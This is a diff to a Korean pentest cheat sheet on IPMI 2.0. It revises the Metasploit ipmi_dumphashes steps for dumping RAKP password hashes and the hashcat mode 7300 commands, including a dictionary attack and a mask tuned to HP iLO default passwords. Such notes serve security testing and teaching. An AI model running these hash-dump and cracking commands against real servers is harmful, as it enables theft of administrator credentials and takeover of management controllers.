@@ -65,36 +65,35 @@ IPMI 2.0 의 RAKP 프로토콜은 유효한 사용자명에 대해 비밀번호�
 
 ```bash
 # Metasploit - 해시 덤프
-msfconsole -q
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 > set RHOSTS <IP>
-msf6 > set OUTPUT_FILE ipmi.hash       # 해시를 파일로 저장 (Unknown datastore option 뜰 경우 OUTPUT_HASHCAT_FILE로 지정)
+msf6 > set OUTPUT_HASHCAT_FILE ipmi.hash    # hashcat 7300 포맷으로 저장 (사용자명 없이 salt:hash)
 msf6 > run
 
-# 세부 옵션은 콘솔에서 직접 확인 (사용자/비번 사전 등)
-msf6 > show options
-msf6 > show advanced
+# 주의: 저장 옵션 이름은 버전마다 다르다
+#   OUTPUT_HASHCAT_FILE  - hashcat 용 (salt:hash)
+#   OUTPUT_JOHN_FILE     - john 용
+#   (구버전 문서의 OUTPUT_FILE 은 없을 수 있음 - show options 로 확인)
 ```
 
-출력은 `<user>:<salt>...:<hash>` 형태로, hashcat 모드 7300 에 바로 들어간다.
+run 화면에도 결과가 `<user>:<salt>:<hash>` 형태로 찍힌다. 맨 앞 user 는 사람이 보기 쉬우라고 붙은 라벨이고, 사용자명 자체는 salt 안에 16진수로 이미 포함돼 있다 (salt 끝의 61646d696e = "admin").
 
 ---
 
 ## 5. 해시 크랙
 
-덤프한 해시는 hashcat 모드 7300(IPMI2 RAKP HMAC-SHA1)으로 크랙한다.
+덤프한 해시는 hashcat 모드 7300(IPMI2 RAKP HMAC-SHA1)으로 크랙한다. 7300 입력 형식은 `<salt>:<hash>` 두 칸이다. run 화면 출력을 복사했다면 맨 앞 `<user>:` 를 반드시 떼야 한다. 안 그러면 칸이 세 개가 돼서 "Token length exception" 이 난다. OUTPUT_HASHCAT_FILE 로 저장한 파일은 이미 user 가 빠져 있어 그대로 쓰면 된다.
 
 ```bash
-# hashcat
+# 화면에서 복사한 경우 - 맨 앞 user: 제거하고 저장
+echo '<salt>:<hash>' > ipmi.hash
+
+# 크랙
 hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
 
 # HP iLO 기본 비밀번호는 8자리 대문자+숫자 - 마스크가 사전보다 빠르다
 hashcat -m 7300 ipmi.hash -a 3 -1 ?u?d ?1?1?1?1?1?1?1?1
 ```
-
-iLO 계정(Administrator)은 공장 출고 시 8자리 랜덤 비번이 라벨에 붙어 있어, 위 마스크로 전수 탐색이 현실적이다. 다른 벤더는 rockyou 같은 사전이 먼저다.
-
----
 
 ## 6. cipher 0 인증 우회
 
